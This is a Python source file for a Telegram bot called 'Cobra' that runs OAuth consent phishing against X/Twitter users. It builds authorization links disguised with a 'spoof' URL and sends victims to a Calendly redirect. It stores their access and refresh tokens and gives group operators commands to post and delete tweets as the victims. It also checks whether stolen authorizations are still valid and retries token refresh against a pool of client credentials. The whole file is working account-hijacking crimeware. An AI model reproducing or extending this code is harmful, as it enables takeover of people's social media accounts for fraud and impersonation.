import re
import uuid
import base64
import secrets
import requests
import validators
from bot.handlers import keyboards

from shared.db import get_db
from shared.config import config
from shared.utils import parse, permission_check, tweet, handle_successful_tweet, handle_token_refresh_and_retry, handle_generic_error, refresh_oauth_tokens

from telegram.constants import ChatMemberStatus

parse_mode = "MarkdownV2"

db = get_db()
groups = db["groups"]

clients = []
c_list = config["CLIENTS"].split(",")

for client in c_list:
    data = client.split(":")
    clients.append({
        "client_id": data[0],
        "client_secret": data[1]
    })

DOMAIN = config["DOMAIN"]

async def start(update, context):
    chat_id = update.effective_chat.id

    full_name = parse(update.effective_user.full_name)

    reply_markup = keyboards.add_to_group()
    text = f"🐍 *Welcome to Cobra, _{full_name}_*\\! 🐍\n\n💬 _To get started, add me to a group and use the */setup* command to setup your group for OAuth\\._"

    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup)

async def unsubscribed(update, context):
    chat_id = update.effective_chat.id

    reply_markup = keyboards.unsubscribed()
    text = "❗ *JOIN THE CHANNEL TO USE COBRA* ❗\n\n_⚠️ It seems that you aren't in the channel\\. Join the channel using the button below to continue\\._"
    
    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup)

async def help(update, context) -> None:
    chat_id = update.effective_chat.id
    
    text = ("❔ *List of Commands*\n\n "
            "*•* 🐦 */post\\_tweet* \\<username\\> \\<message\\> \\- Posts a tweet on behalf of the user\\.\n "
            # "*•* 🔁 */post\\_retweet* \\<username\\> \\<tweet\\_id\\> \\- Retweets a tweet on behalf of the user\\.\n "
            # "*•* 💬 */post\\_quote\\_tweet* \\<username\\> \\<tweet\\_url\\> \\<message\\> \\- Quotes a tweet on behalf of the user\\.\n "
            # "*•* 💬 */post\\_reply* \\<username\\> \\<tweet\\_id\\> \\<message\\> \\- Posts a reply to a tweet on behalf of the user\\.\n "
            "*•* ❌ */delete\\_tweet* \\<username\\> \\<tweet\\_id\\> \\- Deletes a tweet on behalf of the user\\.\n "
            "*•* 🐍 */check\\_auth* \\<username\\> \\- Checks if a user is still authorized\\.\n "
            "*•* 🔗 */display\\_endpoint* \\- Displays your personal endpoint\\.\n "
            "*•* 👥 */display\\_users* \\- Displays the list of authenticated users\\.\n "
            "*•* 📄 */display\\_whitelist* \\- Displays the list of users authorized to use admin commands in the group\\.\n "
            "*•* 🔄 */set\\_redirect* \\<url\\> \\- Sets the redirect upon authorization\\.\n "
            "*•* 🌀 */set\\_spoof* \\<url\\> \\- Sets the spoof url shown in X/Twitter and refreshes endpoints\\.\n "
            "*•* 💬 */set\\_replies* \\- Enables/disables replies for new tweets\\.\n "
            "*•* 🆔 */set\\_client\\_id* \\<client\\_id\\> \\- Sets the OAuth application client id\\.\n "
            "*•* 🔒 */set\\_client\\_secret* \\<client\\_secret\\> \\- Sets the OAuth application client secret\\.\n "
            "*•* ❔ */help* \\- Displays the list of commands\\.")
    await context.bot.send_message(chat_id, text, parse_mode)

async def setup(update, context):
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, setup_command=True): return

    group = groups.find_one({"ids.group": chat_id})
    if group:
        text = "⚠️ *This group is already setup for OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    owner = next(admin.user for admin in await context.bot.get_chat_administrators(chat_id) if admin.status == ChatMemberStatus.OWNER)
    owner_id = owner.id
    owner_fullname = parse(owner.full_name)

    group_data = {
        "identifier": secrets.token_urlsafe(16),
        "ids": { 
            "group": chat_id,
            "owner": owner_id
        },
        "client": {
            "id": None,
            "secret": None
        },
        "redirect": "https://calendly.com/cointele",
        "whitelist": [],
        "identifiers": [
            {
                "user_id": owner_id,
                "identifier": secrets.token_urlsafe(16)
            }
        ],
        "users": [],
        "settings": {
            "replies": False
        }
    }
    groups.insert_one(group_data)

    header = f"✅ *Group successfully setup for OAuth\\.*"
    body = f"╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* {parse(chat_id)}\n┣  *Group Name:* {parse(update.effective_chat.title)}\n┣  *Owner ID*: {owner_id}\n╰  *Owner Name:* [{owner_fullname}](tg://user?id={owner_id})"
    footer = "💬 _Use the */help* command to get the list of available commands\\._"

    text = f"{header}\n\n{body}\n\n{footer}"
    await context.bot.send_message(chat_id, text, parse_mode)

    header = "🔔 *A new group has been setup for Oauth\\.* 🔔"

    text = f"{header}\n\n{body}"
    await context.bot.send_message(7434895838, text, parse_mode)

async def set_client_id(update, context) -> None:
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, admin_command=True): return
    
    args = context.args
    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_client_id <client_id>')
    
    group = groups.find_one({"ids.group": chat_id})

    client_id = args[0]
    client_secret = group["client"]["secret"]

    if re.match("^[a-zA-Z0-9]+$", client_id) and len(client_id) == 34:
        groups.update_one(
            {"ids.group": chat_id},
            {"$set": {f"client.id": client_id}}
        )
        
        text = f"✅ *Client ID has successfully been set\\.*\n\n🆔 *Client ID:* {parse(client_id)}\n🔒 *Client Secret:* {parse(client_secret)}"
    else:
        text = "⚠️ *The client ID provided is invalid\\.*"
        
    await context.bot.send_message(chat_id, text, parse_mode)

async def set_client_secret(update, context) -> None:
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, admin_command=True): return

    args = context.args
    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_client_secret <client_secret>')
    
    group = groups.find_one({"ids.group": chat_id})

    client_secret = args[0]
    client_id = group["client"]["id"]

    if (len(client_secret) == 50 and re.match("^[a-zA-Z0-9_-]+$", client_secret)):
        groups.update_one(
            {"ids.group": chat_id},
            {"$set": {f"client.secret": client_secret}}
        )
        
        text = f"✅ *Client secret has successfully been set for this group\\.*\n\n🆔 *Client ID:* {parse(client_id)}\n🔒 *Client Secret:* {parse(client_secret)}"
    else:
        text = "⚠️ *The client secret provided is invalid\\.*"
        
    await context.bot.send_message(chat_id, text, parse_mode)

async def set_redirect(update, context) -> None:
    chat_id = update.effective_chat.id
    
    if not await permission_check(update, context, groups, admin_command=True): return
    
    args = context.args
    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_redirect <url>')

    url = args[0]
    if validators.url(url):
        groups.update_one(
            {"ids.group": chat_id},
            {"$set": {"redirect": url}}
        )

        text = f"✅ *Redirect URL successfully set to {parse(url)}\\.*"
    else:
        text = "⚠️ *The URL provided is invalid \\(format: https://calendly\\.com/\\)\\.*"
        
    await context.bot.send_message(chat_id, text, parse_mode)
        
async def set_spoof(update, context) -> None:
    chat_id = update.effective_chat.id
    
    if not await permission_check(update, context, groups, admin_command=True): return
    
    args = context.args
    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /set_spoof <url>')

    url = args[0]
    if validators.url(url):
        group = groups.find_one({"ids.group": chat_id}, {"identifiers": 1})

        for item in group["identifiers"]:
            item["identifier"] = str(uuid.uuid4())

        groups.update_one(
            {"ids.group": chat_id},
            {"$set": {"spoof": url, "identifiers": group["identifiers"]}}
        )

        text = f"✅ *Spoofed URL successfully set to {parse(url)}\\. All endpoints have been refresh\\.*"
    else:
        text = "⚠️ *The URL provided is invalid \\(format: https://calendly\\.com/\\)\\.*"
           
    await context.bot.send_message(chat_id, text, parse_mode)

async def set_replies(update, context) -> None:
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, admin_command=True): return
        
    group = groups.find_one({"ids.group": chat_id})

    result = groups.update_one(
        {"ids.group": chat_id},
        {"$set": {
            "replies": not group["replies"]
        }}
    )

    replies_msg = "_mentioned\\-only_" if group['replies'] else "_enabled_"
    if result.modified_count > 0:
        text = f"✅ *Successfully set replies on tweets from accounts to {replies_msg}\\.*"
    else:
        text = f"❌ *Failed to set replies on tweets from accounts to {replies_msg} due to an unknown error\\.*"

    await context.bot.send_message(chat_id, text, parse_mode)

async def display_endpoint(update, context) -> None:
    chat_id = update.effective_chat.id
    
    if not await permission_check(update, context, groups): return

    user_id = update.effective_user.id

    group = groups.find_one({"ids.group": chat_id})
    matched = next((i for i in group["identifiers"] if i["user_id"] == user_id), None)

    if matched:
        identifier = matched["identifier"]
    else:
        identifier = secrets.token_urlsafe(16)
        groups.update_one(
            {"ids.group": chat_id},
            {"$push": {
                "identifiers": {
                    "user_id": user_id,
                    "identifier": identifier
                }
            }}
        )

    client_id = group["client"]["id"]
    client_secret = group["client"]["secret"]

    if not client_id or not client_secret:
        text = f"⚠️ *Client {'ID' if not client_id else 'secret'} hasn't been set yet\\.*\n\n💬 _To set the client {'ID' if not client_id else 'secret'}, use the */set\\_client\\_{'id' if not client_id else 'secret'}* command followed by the OAuth app client {'ID' if not client_id else 'secret'}_\\."
    else:
        domain = config["DOMAIN"]
        callback_url = urllib.parse.quote(f"{domain}/auth", safe="")

        group_token = group["identifier"]
        user_token = identifier

        raw_state = f"{group_token}.{user_token}"
        state = base64.urlsafe_b64encode(raw_state.encode()).decode().rstrip("=")

        endpoint = (f'https://x.com/i/oauth2/authorize?response_type=code&client_id={client_id}'
                            f'&redirect_uri={callback_url}'
                            f'&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write'
                            f'&state={state}&code_challenge=challenge&code_challenge_method=plain')

        reply_markup = keyboards.refresh()
        text = f"🔗 *Your endpoint*: {endpoint}"

    await context.bot.send_message(chat_id, text, parse_mode)

async def display_users(update, context, page=1, message_id=None) -> None:
    chat_id = update.effective_chat.id
    
    if not await permission_check(update, context, groups): return
        
    group = groups.find_one({"ids.group": chat_id})
    users = group['users']
    online_users = [u for u in users if u.get("access_token")]
    if users:
        user_count = len(users)
        sorted_users = sorted(users, key=lambda u: (bool(u.get('access_token')), -u['timestamp'].timestamp()))

        users_per_page = 15
        total_pages = max(1, -(-user_count // users_per_page))
        
        page = max(1, min(page, total_pages))
        
        start_idx = (page - 1) * users_per_page
        end_idx = start_idx + users_per_page
        paginated_users = sorted_users[start_idx:end_idx]

        user_texts = []
        for user in paginated_users:
            authorized_at = parse(user['timestamp'].strftime('%m-%d-%Y'))
            username = user['username']
            access_token = user.get('access_token')

            user_text = (
                f"> {'🟢' if access_token else '🔴'} *||[{parse(username)}](https://x\\.com/{username})||* \\| _{authorized_at}_\n"
            )
            user_texts.append(user_text)
            
        reply_markup = keyboards.users_pagination(paginated_users, page, total_pages, users_per_page)
        text = f"*👤 Authenticated Users* \\({len(online_users)}/{len(users)}\\)\n\n" + "\n\n".join(user_texts)

        if message_id:
            await context.bot.edit_message_text(
                chat_id=chat_id, 
                message_id=message_id, 
                text=text, 
                parse_mode=parse_mode, 
                reply_markup=reply_markup, 
                disable_web_page_preview=True
            )        
        else:
            message = await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup, disable_web_page_preview=True)
            context.user_data["users_message_id"] = message.message_id
    else:
        text = "*👤 Authenticated Users*\n\n> Nothing to see here 👀"
        await context.bot.send_message(chat_id, text, parse_mode, disable_web_page_preview=True)

async def display_whitelist(update, context) -> None:
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, owner_command=True): return

    user_lines = []
    group = groups.find_one({"ids.group": chat_id})
    whitelist = group["whitelist"]
    if whitelist:
        for user_id in whitelist:
            user_lines.append(f"> *[{user_id}](tg://user?id={user_id})*")
    else:
        user_lines.append("> 👀 Nothing to see here\\.\\.\\.")

    reply_markup = keyboards.whitelist()
    text = "📄 *Admin Command Whitelist*\n\n" + "\n".join(user_lines) + "\n\n💬 _Users in this list have access to */set\\_client\\_id*, */set\\_client\\_secret*, */set\\_redirect*, */set\\_spoof*, */set\\_replies*, */post\\_tweet*, */delete\\_tweet*, and */check\\_auth*\\._"

    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup, disable_web_page_preview=True) 

async def add_whitelist(update, context, query):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    group = groups.find_one({ "ids.group": chat_id })
    if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")

    owner_id = group["ids"]["owner"]
    if owner_id != user_id: return await query.answer("❌ Only the group owner may use this action.")

    context.user_data["awaiting_whitelist_id"] = True
    text = "ℹ️ *Enter the user id of the user you would like to add to the admin command whitelist:*"

    await context.bot.send_message(chat_id, text, parse_mode)

async def whitelist_addition(update, context, user_id):
    chat_id = update.effective_chat.id

    group = groups.find_one({ "ids.group": chat_id })
    if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")

    if user_id in group["whitelist"]: return await context.bot.send_message(f"⚠️ *The user _[{user_id}](tg://user?id={user_id})_ is already in the whitelist\\.*")

    result = groups.update_one(
        {"ids.group": chat_id},
        {"$push": {"whitelist": user_id}}
    )

    if result.modified_count > 0:
        text = f"✅ *Successfully added the user _[{user_id}](tg://user?id={user_id})_ to the whitelist\\.*"
    else:
        text = f"❌ *Failed to add the user _[{user_id}](tg://user?id={user_id})_ to the whitelist due to an unknown error\\.*"

    await context.bot.send_message(chat_id, text, parse_mode)

async def remove_whitelist(update, context, query):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    group = groups.find_one({ "ids.group": chat_id })
    if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")

    owner_id = group["ids"]["owner"]
    if owner_id != user_id: return await query.answer("❌ Only the group owner may use this action.")

    reply_markup = keyboards.whitelist_pagination(group["whitelist"])
    text = "ℹ️ *Select the user id of the user you would like to remove from the admin command whitelist:*"

    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup)

async def whitelist_removal(update, context, user_id):
    chat_id = update.effective_chat.id

    group = groups.find_one({ "ids.group": chat_id })
    if not group: return await context.bot.send_message("⚠️ *An unkown error has occurred\\.*")

    if user_id not in group["whitelist"]: return await context.bot.send_message(f"⚠️ *The user _[{user_id}](tg://user?id={user_id})_ is not in the whitelist\\.*")

    result = groups.update_one(
        {"ids.group": chat_id},
        {"$pull": {"whitelist": user_id}}
    )

    if result.modified_count > 0:
        text = f"✅ *Successfully removed the user _[{user_id}](tg://user?id={user_id})_ from the whitelist\\.*"
    else:
        text = f"❌ *Failed to remove the user _[{user_id}](tg://user?id={user_id})_ from the whitelist due to an unknown error\\.*"

    await context.bot.send_message(chat_id, text, parse_mode)

async def post_tweet(update, context) -> None:
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, admin_command=True): return

    args = context.args
    if len(args) < 2: return await update.message.reply_text('⚙️ Usage: /post_tweet <username> <message>')

    community_id = int(args[0]) if type(args[0]) == int else 0
    is_community = True if type(args[0]) == int else False

    username = args[0] if not is_community else args[1]
        
    group = groups.find_one({"ids.group": chat_id})

    user = next((u for u in group.get('users', []) if u['username'].lower() == username.lower()), None)
    if not user:
        text = f"⚠️ *User _{parse(username)}_ has not authorized with OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)
        
    message = ' '.join(arg.strip()for arg in (args[1:] if not is_community else args[2:])).replace('\\n', '\n')
    access_token, refresh_token, username = user.get("access_token"), user.get("refresh_token"), user["username"]
    if access_token:
        res, r = tweet(chat_id=chat_id, token=access_token, message=message, is_community=is_community, community_id=community_id)
        
        if res.status_code == 201:
            return await handle_successful_tweet(context, chat_id, username, r, is_community=is_community)
            
        if res.status_code == 401:
            return await handle_token_refresh_and_retry(context, chat_id, user, refresh_token, message=message, is_community=is_community, community_id=community_id)
    
        if res.status_code == 403:
            return await handle_token_refresh_and_retry(context, chat_id, user, refresh_token, message=message, is_community=is_community, community_id=community_id)

        await handle_generic_error(context, chat_id, res, r)
    else:
        text = f"❌ *User _[{parse(username)}](https://x\\.com/{parse(username)})_ revoked OAuth access and is no longer valid\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)

async def delete_tweet(update, context) -> None:
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if not await permission_check(update, context, groups, admin_command=True): return

    args = context.args
    if len(args) < 2: return await update.message.reply_text("⚙️ Usage: /delete_tweet <username> <id>")

    username_arg, tweet_id = args[0], args[1]

    group = groups.find_one({"ids.group": chat_id})

    user = next(u for u in group.get("users", []) if u["username"].lower() == username_arg.lower())
    if not user: return await context.bot.send_message(chat_id, f"⚠️ *User _{parse(username_arg)}_ has not authorized with OAuth\\.*", parse_mode=parse_mode)

    username = parse(user["username"])
    refresh_token = user.get("refresh_token")
    access_token = user.get("access_token")

    async def revoke_message(chat_id, context, username):
        text = f"❌ *User _[{username}](https://x\\.com/{username})_ revoked OAuth access and is no longer valid\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)

    if not access_token: return await revoke_message(chat_id, context, username)

    url = f"https://api.twitter.com/2/tweets/{tweet_id}"

    def delete_with_token(token: str):
        return requests.delete(
            url,
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json"
            }
        )

    async def refresh_access_token():
        credentials = user.get("credentials")

        if credentials:
            token = await refresh_oauth_tokens(refresh_token, credentials)
            if token[0]:
                return token

        for setting in clients:
            client_id = setting["client_id"]
            client_secret = setting["client_secret"]
            creds = base64.b64encode(f"{client_id}:{client_secret}".encode()).decode()
            token = await refresh_oauth_tokens(refresh_token, creds)
            if token[0]:
                return token

        return None, None

    res = delete_with_token(access_token)

    if res.status_code in (401, 403):
        new_access_token, new_refresh_token = await refresh_access_token()

        if not new_access_token:
            groups.update_one(
                {"ids.group": chat_id, "users.username": user["username"]},
                {"$unset": {"users.$.access_token": ""}}
            )
            return await revoke_message(chat_id, context, username)

        groups.update_one(
            {"ids.group": chat_id, "users.username": user["username"]},
            {"$set": {
                "users.$.access_token": new_access_token or access_token,
                "users.$.refresh_token": new_refresh_token or refresh_token
            }}
        )

        res = delete_with_token(new_access_token)

    if res.status_code == 200:
        return await context.bot.send_message(
            chat_id,
            f"✅ *Tweet successfully deleted by user "
            f"||[{username}](https://x\\.com/{username})||\\.*\n"
            f"🐦 *Tweet ID:* `{tweet_id}`",
            parse_mode,
            disable_web_page_preview=True
        )

    return await context.bot.send_message(
        chat_id,
        f"❌ *Deletion failed\\.*\n```{res.json()}```",
        parse_mode
    )

async def check_auth(update, context) -> None:
    chat_id = update.effective_chat.id

    if not await permission_check(update, context, groups, admin_command=True): return
            
    args = context.args
    if len(args) < 1: return await update.message.reply_text('⚙️ Usage: /check_auth <username>')

    group = groups.find_one({ "ids.group": chat_id })

    user = next((u for u in group["users"] if u['username'].lower() == args[0].lower()), None)
    if not user:
        formatted = parse(args[0])
        text = f"⚠️ *User _{formatted}_ has not authorized with OAuth\\.*"
        
        return await context.bot.send_message(chat_id, text, parse_mode)
        
    refresh_token, credentials, username = user.get("refresh_token"), user.get("credentials"), parse(user["username"])
    if refresh_token:
        new_access_token, new_refresh_token = await refresh_oauth_tokens(refresh_token, credentials)

        if not new_access_token:
            for setting in clients:
                client_id = setting["client_id"]
                client_secret = setting["client_secret"]
                credentials = base64.b64encode(f"{client_id}:{client_secret}".encode()).decode('utf-8')

                new_access_token, new_refresh_token = await refresh_oauth_tokens(refresh_token, credentials)
                
                if new_access_token:
                    break
        
        if not new_access_token: 
            groups.update_one(
                {"ids.group": chat_id, "users.username": user["username"]},
                {"$unset": {
                    "users.$.access_token": ""
                }}
            )
            text = f"❌ *User _[{username}](https://x\\.com/{username})_ revoked OAuth access and is no longer valid\\.*"
        else:
            groups.update_one(
                {"ids.group": chat_id, "users.username": user["username"]},
                {"$set": {
                    "users.$.access_token": new_access_token,
                    "users.$.refresh_token": new_refresh_token
                }}
            )
            text = f"✅ *User _||[{username}](https://x\\.com/{username})||_ is still authorized and valid\\.*"
        await context.bot.send_message(chat_id, text, parse_mode, disable_web_page_preview=True)
            
    else:
        text = f"❌ *User _[{username}](https://x\\.com/{username})_ revoked OAuth access and is no longer valid\\.*"
        await context.bot.send_message(chat_id, text, parse_mode)